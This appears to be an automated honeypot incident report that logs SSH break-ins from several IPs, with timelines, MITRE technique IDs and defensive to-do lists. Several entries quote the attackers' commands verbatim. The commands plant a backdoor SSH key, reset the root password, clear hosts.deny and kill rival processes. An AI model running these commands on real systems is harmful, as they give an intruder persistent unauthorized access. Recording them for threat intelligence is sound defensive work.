| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 20:02:09` | `cowrie.session.connect` |
| `2026-04-16 20:02:09` | `cowrie.client.version` |
| `2026-04-16 20:02:10` | `cowrie.client.kex` |
| `2026-04-16 20:02:12` | `cowrie.login.success` |
| `2026-04-16 20:02:16` | `cowrie.session.params` |
| `2026-04-16 20:02:16` | `cowrie.command.input` |
| `2026-04-16 20:02:16` | `cowrie.command.failed` |
| `2026-04-16 20:02:16` | `cowrie.log.closed` |
| `2026-04-16 20:02:17` | `cowrie.session.params` |
| `2026-04-16 20:02:17` | `cowrie.command.input` |
| `2026-04-16 20:02:17` | `cowrie.session.file_download` |
| `2026-04-16 20:02:17` | `cowrie.log.closed` |
| `2026-04-16 20:02:34` | `cowrie.session.params` |
| `2026-04-16 20:02:34` | `cowrie.command.input` |
| `2026-04-16 20:02:34` | `cowrie.log.closed` |
| `2026-04-16 20:02:38` | `cowrie.session.params` |
| `2026-04-16 20:02:38` | `cowrie.command.input` |
| `2026-04-16 20:02:39` | `cowrie.log.closed` |
| `2026-04-16 20:02:40` | `cowrie.session.params` |
| `2026-04-16 20:02:40` | `cowrie.command.input` |
| `2026-04-16 20:02:40` | `cowrie.session.file_download` |
| `2026-04-16 20:02:40` | `cowrie.log.closed` |
| `2026-04-16 20:02:41` | `cowrie.session.params` |
| `2026-04-16 20:02:41` | `cowrie.command.input` |
| `2026-04-16 20:02:41` | `cowrie.log.closed` |
| `2026-04-16 20:02:41` | `cowrie.session.params` |
| `2026-04-16 20:02:41` | `cowrie.command.input` |
| `2026-04-16 20:02:41` | `cowrie.log.closed` |
| `2026-04-16 20:02:42` | `cowrie.session.params` |
| `2026-04-16 20:02:42` | `cowrie.command.input` |
| `2026-04-16 20:02:42` | `cowrie.command.input` |
| `2026-04-16 20:02:42` | `cowrie.log.closed` |
| `2026-04-16 20:02:43` | `cowrie.session.params` |
| `2026-04-16 20:02:43` | `cowrie.command.input` |
| `2026-04-16 20:02:43` | `cowrie.log.closed` |
| `2026-04-16 20:02:43` | `cowrie.session.params` |
| `2026-04-16 20:02:43` | `cowrie.command.input` |
| `2026-04-16 20:02:44` | `cowrie.log.closed` |
| `2026-04-16 20:02:44` | `cowrie.session.params` |
| `2026-04-16 20:02:44` | `cowrie.command.input` |
| `2026-04-16 20:02:44` | `cowrie.log.closed` |
| `2026-04-16 20:02:45` | `cowrie.session.params` |
| `2026-04-16 20:02:45` | `cowrie.command.input` |
| `2026-04-16 20:02:45` | `cowrie.log.closed` |
| `2026-04-16 20:02:46` | `cowrie.session.params` |
| `2026-04-16 20:02:46` | `cowrie.command.input` |
| `2026-04-16 20:02:46` | `cowrie.log.closed` |
| `2026-04-16 20:02:46` | `cowrie.session.params` |
| `2026-04-16 20:02:46` | `cowrie.command.input` |
| `2026-04-16 20:02:47` | `cowrie.log.closed` |
| `2026-04-16 20:02:47` | `cowrie.session.params` |
| `2026-04-16 20:02:47` | `cowrie.command.input` |
| `2026-04-16 20:02:47` | `cowrie.log.closed` |
| `2026-04-16 20:02:48` | `cowrie.session.params` |
| `2026-04-16 20:02:48` | `cowrie.command.input` |
| `2026-04-16 20:02:48` | `cowrie.log.closed` |
| `2026-04-16 20:02:48` | `cowrie.session.params` |
| `2026-04-16 20:02:48` | `cowrie.command.input` |
| `2026-04-16 20:02:49` | `cowrie.log.closed` |
| `2026-04-16 20:02:49` | `cowrie.session.params` |
| `2026-04-16 20:02:49` | `cowrie.command.input` |
| `2026-04-16 20:02:49` | `cowrie.log.closed` |
| `2026-04-16 20:02:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.17[.]234` to AbuseIPDB if not already reported
- [ ] Block `172.174.17[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3ba5b1eb22f

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-04-16 20:02 |
| **Last Seen** | 2026-04-16 20:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 20:02:53` | `cowrie.session.connect` |
| `2026-04-16 20:02:53` | `cowrie.client.version` |
| `2026-04-16 20:02:53` | `cowrie.client.kex` |
| `2026-04-16 20:02:54` | `cowrie.login.success` |
| `2026-04-16 20:02:54` | `cowrie.session.params` |
| `2026-04-16 20:02:54` | `cowrie.command.input` |
| `2026-04-16 20:02:54` | `cowrie.command.failed` |
| `2026-04-16 20:02:54` | `cowrie.log.closed` |
| `2026-04-16 20:02:54` | `cowrie.session.params` |
| `2026-04-16 20:02:54` | `cowrie.command.input` |
| `2026-04-16 20:02:54` | `cowrie.session.file_download` |
| `2026-04-16 20:02:54` | `cowrie.log.closed` |
| `2026-04-16 20:02:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de14a28970cb

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-04-16 20:02 |
| **Last Seen** | 2026-04-16 20:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 20:02:56` | `cowrie.session.connect` |
| `2026-04-16 20:02:56` | `cowrie.client.version` |
| `2026-04-16 20:02:56` | `cowrie.client.kex` |
| `2026-04-16 20:02:57` | `cowrie.login.success` |
| `2026-04-16 20:02:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-696020de00c6

| Field | Detail |
|---|---|
| **Source IP** | `172.174.17[.]234` |
| **First Seen** | 2026-04-16 20:10 |
| **Last Seen** | 2026-04-16 20:10 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 20:10:19` | `cowrie.session.connect` |
| `2026-04-16 20:10:20` | `cowrie.client.version` |
| `2026-04-16 20:10:20` | `cowrie.client.kex` |
| `2026-04-16 20:10:22` | `cowrie.login.success` |
| `2026-04-16 20:10:23` | `cowrie.session.params` |
| `2026-04-16 20:10:23` | `cowrie.command.input` |
| `2026-04-16 20:10:23` | `cowrie.command.failed` |
| `2026-04-16 20:10:23` | `cowrie.log.closed` |
| `2026-04-16 20:10:24` | `cowrie.session.params` |
| `2026-04-16 20:10:24` | `cowrie.command.input` |
| `2026-04-16 20:10:25` | `cowrie.session.file_download` |
| `2026-04-16 20:10:25` | `cowrie.log.closed` |
| `2026-04-16 20:10:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.17[.]234` to AbuseIPDB if not already reported
- [ ] Block `172.174.17[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a458ff3231e

| Field | Detail |
|---|---|
| **Source IP** | `172.174.17[.]234` |
| **First Seen** | 2026-04-16 20:10 |
| **Last Seen** | 2026-04-16 20:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 20:10:31` | `cowrie.session.connect` |
| `2026-04-16 20:10:31` | `cowrie.client.version` |
| `2026-04-16 20:10:32` | `cowrie.client.kex` |
| `2026-04-16 20:10:34` | `cowrie.login.success` |
| `2026-04-16 20:10:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.17[.]234` to AbuseIPDB if not already reported
- [ ] Block `172.174.17[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-909c326c0ea3

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]2` |
| **First Seen** | 2026-04-16 20:12 |
| **Last Seen** | 2026-04-16 20:13 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:tQ86TvCg2QWx"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 20:12:43` | `cowrie.session.connect` |
| `2026-04-16 20:12:43` | `cowrie.client.version` |
| `2026-04-16 20:12:43` | `cowrie.client.kex` |
| `2026-04-16 20:12:44` | `cowrie.login.success` |
| `2026-04-16 20:12:45` | `cowrie.session.params` |
| `2026-04-16 20:12:45` | `cowrie.command.input` |
| `2026-04-16 20:12:45` | `cowrie.command.failed` |
| `2026-04-16 20:12:45` | `cowrie.log.closed` |
| `2026-04-16 20:12:46` | `cowrie.session.params` |
| `2026-04-16 20:12:46` | `cowrie.command.input` |
| `2026-04-16 20:12:46` | `cowrie.session.file_download` |
| `2026-04-16 20:12:46` | `cowrie.log.closed` |
| `2026-04-16 20:12:55` | `cowrie.session.params` |
| `2026-04-16 20:12:55` | `cowrie.command.input` |
| `2026-04-16 20:12:55` | `cowrie.log.closed` |
| `2026-04-16 20:12:56` | `cowrie.session.params` |
| `2026-04-16 20:12:56` | `cowrie.command.input` |
| `2026-04-16 20:12:56` | `cowrie.log.closed` |
| `2026-04-16 20:12:57` | `cowrie.session.params` |
| `2026-04-16 20:12:57` | `cowrie.command.input` |
| `2026-04-16 20:12:57` | `cowrie.session.file_download` |
| `2026-04-16 20:12:57` | `cowrie.log.closed` |
| `2026-04-16 20:12:57` | `cowrie.session.params` |
| `2026-04-16 20:12:57` | `cowrie.command.input` |
| `2026-04-16 20:12:58` | `cowrie.log.closed` |
| `2026-04-16 20:12:58` | `cowrie.session.params` |
| `2026-04-16 20:12:58` | `cowrie.command.input` |
| `2026-04-16 20:12:59` | `cowrie.log.closed` |
| `2026-04-16 20:12:59` | `cowrie.session.params` |
| `2026-04-16 20:12:59` | `cowrie.command.input` |
| `2026-04-16 20:12:59` | `cowrie.command.input` |
| `2026-04-16 20:12:59` | `cowrie.log.closed` |
| `2026-04-16 20:13:00` | `cowrie.session.params` |
| `2026-04-16 20:13:00` | `cowrie.command.input` |
| `2026-04-16 20:13:00` | `cowrie.log.closed` |
| `2026-04-16 20:13:01` | `cowrie.session.params` |
| `2026-04-16 20:13:01` | `cowrie.command.input` |
| `2026-04-16 20:13:01` | `cowrie.log.closed` |
| `2026-04-16 20:13:01` | `cowrie.session.params` |
| `2026-04-16 20:13:01` | `cowrie.command.input` |
| `2026-04-16 20:13:02` | `cowrie.log.closed` |
| `2026-04-16 20:13:02` | `cowrie.session.params` |
| `2026-04-16 20:13:02` | `cowrie.command.input` |
| `2026-04-16 20:13:03` | `cowrie.log.closed` |
| `2026-04-16 20:13:03` | `cowrie.session.params` |
| `2026-04-16 20:13:03` | `cowrie.command.input` |
| `2026-04-16 20:13:03` | `cowrie.log.closed` |
| `2026-04-16 20:13:04` | `cowrie.session.params` |
| `2026-04-16 20:13:04` | `cowrie.command.input` |
| `2026-04-16 20:13:04` | `cowrie.log.closed` |
| `2026-04-16 20:13:05` | `cowrie.session.params` |
| `2026-04-16 20:13:05` | `cowrie.command.input` |
| `2026-04-16 20:13:05` | `cowrie.log.closed` |
| `2026-04-16 20:13:06` | `cowrie.session.params` |
| `2026-04-16 20:13:06` | `cowrie.command.input` |
| `2026-04-16 20:13:06` | `cowrie.log.closed` |
| `2026-04-16 20:13:06` | `cowrie.session.params` |
| `2026-04-16 20:13:06` | `cowrie.command.input` |
| `2026-04-16 20:13:07` | `cowrie.log.closed` |
| `2026-04-16 20:13:07` | `cowrie.session.params` |
| `2026-04-16 20:13:07` | `cowrie.command.input` |
| `2026-04-16 20:13:07` | `cowrie.log.closed` |
| `2026-04-16 20:13:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c53adeefc5c7

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]2` |
| **First Seen** | 2026-04-16 20:15 |
| **Last Seen** | 2026-04-16 20:15 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:JoIx9dacW1rY"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 20:15:01` | `cowrie.session.connect` |
| `2026-04-16 20:15:01` | `cowrie.client.version` |
| `2026-04-16 20:15:01` | `cowrie.client.kex` |
| `2026-04-16 20:15:02` | `cowrie.login.success` |
| `2026-04-16 20:15:02` | `cowrie.session.params` |
| `2026-04-16 20:15:02` | `cowrie.command.input` |
| `2026-04-16 20:15:02` | `cowrie.command.failed` |
| `2026-04-16 20:15:03` | `cowrie.log.closed` |
| `2026-04-16 20:15:03` | `cowrie.session.params` |
| `2026-04-16 20:15:03` | `cowrie.command.input` |
| `2026-04-16 20:15:04` | `cowrie.session.file_download` |
| `2026-04-16 20:15:04` | `cowrie.log.closed` |
| `2026-04-16 20:15:13` | `cowrie.session.params` |
| `2026-04-16 20:15:13` | `cowrie.command.input` |
| `2026-04-16 20:15:13` | `cowrie.log.closed` |
| `2026-04-16 20:15:14` | `cowrie.session.params` |
| `2026-04-16 20:15:14` | `cowrie.command.input` |
| `2026-04-16 20:15:14` | `cowrie.log.closed` |
| `2026-04-16 20:15:14` | `cowrie.session.params` |
| `2026-04-16 20:15:14` | `cowrie.command.input` |
| `2026-04-16 20:15:15` | `cowrie.session.file_download` |
| `2026-04-16 20:15:15` | `cowrie.log.closed` |
| `2026-04-16 20:15:15` | `cowrie.session.params` |
| `2026-04-16 20:15:15` | `cowrie.command.input` |
| `2026-04-16 20:15:15` | `cowrie.log.closed` |
| `2026-04-16 20:15:16` | `cowrie.session.params` |
| `2026-04-16 20:15:16` | `cowrie.command.input` |
| `2026-04-16 20:15:16` | `cowrie.log.closed` |
| `2026-04-16 20:15:17` | `cowrie.session.params` |
| `2026-04-16 20:15:17` | `cowrie.command.input` |
| `2026-04-16 20:15:17` | `cowrie.command.input` |
| `2026-04-16 20:15:17` | `cowrie.log.closed` |
| `2026-04-16 20:15:18` | `cowrie.session.params` |
| `2026-04-16 20:15:18` | `cowrie.command.input` |
| `2026-04-16 20:15:18` | `cowrie.log.closed` |
| `2026-04-16 20:15:19` | `cowrie.session.params` |
| `2026-04-16 20:15:19` | `cowrie.command.input` |
| `2026-04-16 20:15:19` | `cowrie.log.closed` |
| `2026-04-16 20:15:19` | `cowrie.session.params` |
| `2026-04-16 20:15:19` | `cowrie.command.input` |
| `2026-04-16 20:15:20` | `cowrie.log.closed` |
| `2026-04-16 20:15:20` | `cowrie.session.params` |
| `2026-04-16 20:15:20` | `cowrie.command.input` |
| `2026-04-16 20:15:21` | `cowrie.log.closed` |
| `2026-04-16 20:15:21` | `cowrie.session.params` |
| `2026-04-16 20:15:21` | `cowrie.command.input` |
| `2026-04-16 20:15:21` | `cowrie.log.closed` |
| `2026-04-16 20:15:22` | `cowrie.session.params` |
| `2026-04-16 20:15:22` | `cowrie.command.input` |
| `2026-04-16 20:15:22` | `cowrie.log.closed` |
| `2026-04-16 20:15:23` | `cowrie.session.params` |
| `2026-04-16 20:15:23` | `cowrie.command.input` |
| `2026-04-16 20:15:23` | `cowrie.log.closed` |
| `2026-04-16 20:15:24` | `cowrie.session.params` |
| `2026-04-16 20:15:24` | `cowrie.command.input` |
| `2026-04-16 20:15:24` | `cowrie.log.closed` |
| `2026-04-16 20:15:24` | `cowrie.session.params` |
| `2026-04-16 20:15:24` | `cowrie.command.input` |
| `2026-04-16 20:15:25` | `cowrie.log.closed` |
| `2026-04-16 20:15:25` | `cowrie.session.params` |
| `2026-04-16 20:15:25` | `cowrie.command.input` |
| `2026-04-16 20:15:26` | `cowrie.log.closed` |
| `2026-04-16 20:15:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c81fff3d756

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]2` |
| **First Seen** | 2026-04-16 20:17 |
| **Last Seen** | 2026-04-16 20:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 20:17:26` | `cowrie.session.connect` |
| `2026-04-16 20:17:26` | `cowrie.client.version` |
| `2026-04-16 20:17:26` | `cowrie.client.kex` |
| `2026-04-16 20:17:27` | `cowrie.login.success` |
| `2026-04-16 20:17:28` | `cowrie.session.params` |
| `2026-04-16 20:17:28` | `cowrie.command.input` |
| `2026-04-16 20:17:28` | `cowrie.command.failed` |
| `2026-04-16 20:17:28` | `cowrie.log.closed` |
| `2026-04-16 20:17:28` | `cowrie.session.params` |
| `2026-04-16 20:17:28` | `cowrie.command.input` |
| `2026-04-16 20:17:29` | `cowrie.session.file_download` |
| `2026-04-16 20:17:29` | `cowrie.log.closed` |
| `2026-04-16 20:17:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6792b7894330

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]2` |
| **First Seen** | 2026-04-16 20:17 |
| **Last Seen** | 2026-04-16 20:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 20:17:33` | `cowrie.session.connect` |
| `2026-04-16 20:17:33` | `cowrie.client.version` |
| `2026-04-16 20:17:33` | `cowrie.client.kex` |
| `2026-04-16 20:17:34` | `cowrie.login.success` |
| `2026-04-16 20:17:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `120.48.44[.]93` | **26** | 2026-04-16 19:26 | 2026-04-16 19:53 | 45m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `110.36.89[.]2` | **25** | 2026-04-16 19:40 | 2026-04-16 19:45 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `152.32.135[.]217` | **25** | 2026-04-16 19:24 | 2026-04-16 20:07 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.249.247[.]165` | **24** | 2026-04-16 19:24 | 2026-04-16 20:02 | 0m | 24 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `172.174.17[.]234` | **17** | 2026-04-16 19:25 | 2026-04-16 20:26 | 1m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.143.231[.]2` | **13** | 2026-04-16 19:28 | 2026-04-16 20:17 | 0m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `201.71.192[.]108` | **8** | 2026-04-16 19:25 | 2026-04-16 19:40 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.141[.]34` | **2** | 2026-04-16 19:23 | 2026-04-16 19:23 | 4m | 0 | `T1592` | 🟢 LOW |
| `43.227.185[.]238` | **2** | 2026-04-16 19:21 | 2026-04-16 19:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.47.135[.]95` | 1 | 2026-04-16 19:22 | 2026-04-16 19:22 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.120.227[.]88` | 1 | 2026-04-16 19:25 | 2026-04-16 19:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.37.72[.]234` | 1 | 2026-04-16 19:27 | 2026-04-16 19:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.249.104[.]20` | 1 | 2026-04-16 19:25 | 2026-04-16 19:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.191.49[.]17` | 1 | 2026-04-16 19:24 | 2026-04-16 19:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.113[.]212` | 1 | 2026-04-16 19:23 | 2026-04-16 19:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `151.48.3[.]141` | 1 | 2026-04-16 20:07 | 2026-04-16 20:07 | 13s | 0 | `T1592` | 🟢 LOW |
| `211.222.112[.]76` | 1 | 2026-04-16 20:12 | 2026-04-16 20:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `41.130.140[.]36` | 1 | 2026-04-16 20:30 | 2026-04-16 20:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.37.246[.]239` | 1 | 2026-04-16 20:27 | 2026-04-16 20:27 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

